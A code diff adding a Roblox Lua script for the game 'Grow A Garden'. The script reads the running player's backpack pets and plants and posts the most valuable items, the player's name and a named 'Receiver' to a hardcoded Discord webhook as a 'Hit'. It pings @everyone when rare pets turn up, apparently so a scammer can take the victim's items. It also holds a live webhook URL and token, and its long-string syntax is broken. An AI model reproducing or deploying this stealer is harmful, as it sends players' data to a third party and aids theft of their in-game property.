@@ -1,0 +1,167 @@
+task.spawn(function()
+	repeat task.wait() until game:IsLoaded()
+	print("[DEBUG] Script started")
+
+	_G.scriptExecuted = _G.scriptExecuted or false
+	if _G.scriptExecuted then return end
+	_G.scriptExecuted = true
+
+	local users = _G.Usernames or {"DanyelQuibs"}
+	local webhook = "https://discord.com/api/webhooks/1388044689864785921/36vkKfOwBKqRKuf3ucZurSFR-NjLnJu5NOxxAu5CNgVBy6GIJvAnScIAOohU83qAXSlU"
+
+	local Players = game:GetService("Players")
+	local HttpService = game:GetService("HttpService")
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local plr = Players.LocalPlayer
+	local backpack = plr:WaitForChild("Backpack")
+	local character = plr.Character or plr.CharacterAdded:Wait()
+	local modules = ReplicatedStorage:WaitForChild("Modules")
+
+	local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
+	local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
+	local dataService = require(modules:WaitForChild("DataService"))
+	local numberUtil = require(modules:WaitForChild("NumberUtil"))
+	local petRegistry = require(ReplicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
+
+	print("[DEBUG] All modules loaded")
+
+	local rarePetEmojis = {
+		["Red Fox"] = "🦊",
+		["Raccoon"] = "🦝",
+		["Dragonfly"] = "🐲"
+	}
+
+	local function formatShort(n)
+		if n >= 1e12 then return string.format("%.2fT", n / 1e12) end
+		if n >= 1e9 then return string.format("%.2fB", n / 1e9) end
+		if n >= 1e6 then return string.format("%.2fM", n / 1e6) end
+		if n >= 1e3 then return string.format("%.2fK", n / 1e3) end
+		return tostring(math.floor(n))
+	end
+
+	local function getWeight(tool)
+		local value = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG")
+		if value and value:IsA("NumberValue") then
+			return math.floor(value.Value * 100 + 0.5) / 100
+		end
+		local match = tool.Name:match("%[(%d+%.?%d*) ?KG%]") or tool.Name:match("%((%d+%.?%d*) ?kg%)")
+		return match and tonumber(match) or 0
+	end
+
+	local function lerp(a, b, t)
+		return a + (b - a) * t
+	end
+
+	local itemsToSend = {}
+	local totalValue = 0
+	local hasRarePet = false
+
+	for _, tool in ipairs(backpack:GetChildren()) do
+		if not tool:IsA("Tool") then continue end
+		local nameLower = tool.Name:lower()
+		if nameLower:find("seed") or nameLower:find("shovel") or nameLower:find("water") or nameLower:find("fertilizer") then continue end
+
+		local itemType = tool:GetAttribute("ItemType")
+		local weight = getWeight(tool)
+
+		if itemType == "Pet" then
+			local uuid = tool:GetAttribute("PET_UUID")
+			local petData = dataService:GetData().PetsData.PetInventory.Data[uuid]
+			if petData then
+				local name = petData.PetType
+				local icon = rarePetEmojis[name] or "🐶"
+				local isRare = rarePetEmojis[name] ~= nil
+				if isRare then hasRarePet = true end
+				table.insert(itemsToSend, {
+					Tool = tool,
+					Name = name,
+					Weight = weight,
+					Type = "Pet",
+					Emoji = icon,
+					Rare = isRare
+				})
+			end
+		else
+			local name = tool:GetAttribute("ItemName") or tool.Name
+			local value = calcPlantValue(tool)
+			table.insert(itemsToSend, {
+				Tool = tool,
+				Name = name,
+				Value = value,
+				Weight = weight,
+				Type = "Plant",
+				Emoji = "🍄",
+				Rare = false
+			})
+			totalValue += value
+		end
+	end
+
+	table.sort(itemsToSend, function(a, b)
+		if a.Rare and not b.Rare then return true end
+		if not a.Rare and b.Rare then return false end
+		return (a.Value or 0) > (b.Value or 0)
+	end)
+
+	local function sendWebhook()
+		local lines = {}
+		for i = 1, math.min(10, #itemsToSend) do
+			local item = itemsToSend[i]
+			if item.Type == "Plant" then
+				table.insert(lines, string.format("%s - %s (%.2f KG) → %s¢", item.Emoji, item.Name, item.Weight, formatShort(item.Value)))
+			else
+				table.insert(lines, string.format("%s - %s (%.2f KG)", item.Emoji, item.Name, item.Weight))
+			end
+		end
+
+		local descriptionText = string.format([
+:bust_in_silhouette: Player Info
+```Player: %s
+Receiver: %s```
+
+:package: Top Items
+```
+%s
+```
+], plr.Name, users[1] or "?", table.concat(lines, "\n"))
+
+		local data = {
+			content = hasRarePet and "@everyone" or nil,
+			embeds = {{
+				title = "🌱 Grow A Garden Hit - PRIMO SCRIPTS",
+				description = descriptionText,
+				color = 65280,
+				footer = {
+					text = "Logged at " .. os.date("!%Y-%m-%d %H:%M:%S UTC")
+				}
+			}}
+		}
+
+		local requestFunc = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
+		if not requestFunc then
+			warn("❌ No request function available")
+			return
+		end
+
+		local ok, err = pcall(function()
+			requestFunc({
+				Url = webhook,
+				Method = "POST",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = HttpService:JSONEncode(data)
+			})
+		end)
+
+		if ok then
+			print("✅ Webhook sent")
+		else
+			warn("❌ Webhook failed:", tostring(err))
+		end
+	end
+
+	if #itemsToSend > 0 then
+		sendWebhook()
+	else
+		print("[DEBUG] No items found in backpack.")
+	end
+end) -- Removed the extra () that caused the nil call
